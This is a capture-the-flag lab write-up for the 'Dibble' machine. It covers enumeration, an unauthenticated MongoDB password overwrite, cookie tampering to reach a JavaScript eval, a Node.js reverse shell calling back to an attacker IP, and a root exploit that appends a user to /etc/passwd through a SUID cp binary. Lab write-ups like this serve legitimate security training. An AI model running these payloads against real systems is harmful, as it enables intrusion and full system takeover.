# Dibble

### Enumeration

```
3000/tcp  open  http    Node.js (Express middleware)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
27017/tcp open  mongodb MongoDB 4.2.9
|_mongodb-info: ERROR: Script execution failed (use -d to debug)
| mongodb-databases: 
|   ok = 1.0
|   databases
|     0
|       sizeOnDisk = 131072.0
|       name = account-app
|       empty = false
|     1
|       sizeOnDisk = 40960.0
|       name = admin
|       empty = false
|     2
|       sizeOnDisk = 61440.0
|       name = config
|       empty = false
|     3
|       sizeOnDisk = 73728.0
|       name = local
|       empty = false
|_  totalSize = 307200.0
```

```
$ mongo 192.168.108.110
> show dbs
account-app  0.000GB
admin        0.000GB
config       0.000GB
local        0.000GB
> use account-app
switched to db account-app
> show collections
logmsg
users
> db.users.find()
{ "_id" : ObjectId("5f73c575eae85a15b8df908d"), "username" : "administrator", "password" : "ab6edb97f0c7a6455c57f94b7df73263e57113c85f38cd9b9470c8be8d6dd8ac", "facebook" : "NEVER!", "github" : "http://github.com/", "name" : "administrator", "twitter" : "https://twitter.com/sadserver" }

# found admin hash but could not cracked, so we changed it

> db.users.updateOne({username: 'administrator'},{$set: {password: '8737729a3ada8674940065008dd87d9bc110221bf02b1048beab6078349e792c'}})
{ "acknowledged" : true, "matchedCount" : 1, "modifiedCount" : 1 }

# test:password
```

Logged in with creds to 3000 port.

→ Post a new event&#x20;

→ Response: Only the admin can update the Event logs

Looking at it in burp, cookie is interesting

`Cookie: connect.sid=s%3AgpiTPkNbwFtNEslnN3pLyM2hWGHDLdQN.RmUhLtHYOGer6MNa1dYzWu8B5kf%2BQIy4CDeREcK8d8I; userLevel=ZGVmYXVsdA%3D%3D`

userlevel -> URL decode -> base64 -d ZGVmYXVsdA%3D%3D -> ZGVmYXVsdA== -> default

Modifying it to admin

admin -> base64: YWRtaW4= -> url-encode: YWRtaW4%3D

→ Post 1+1&#x20;

User: administrator Event log: 2&#x20;

It's evaluated. NodeJS reverse shell?

### Initial Access

[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#nodejs](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#nodejs)

```
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(80, "192.168.49.108", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
```

### PrivEsc

```
SUID - Check easy privesc, exploits and write perms
-rwsr-xr-x. 1 root root 156K Apr 23  2020 /usr/bin/cp
```

```
$ cd /tmp
$ cp /etc/passwd .

$ echo "cel1s0:\$1\$ignite\$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash" >> passwd
$ cp passwd /etc/passwd
$ su cel1s0
Password: pass123
```
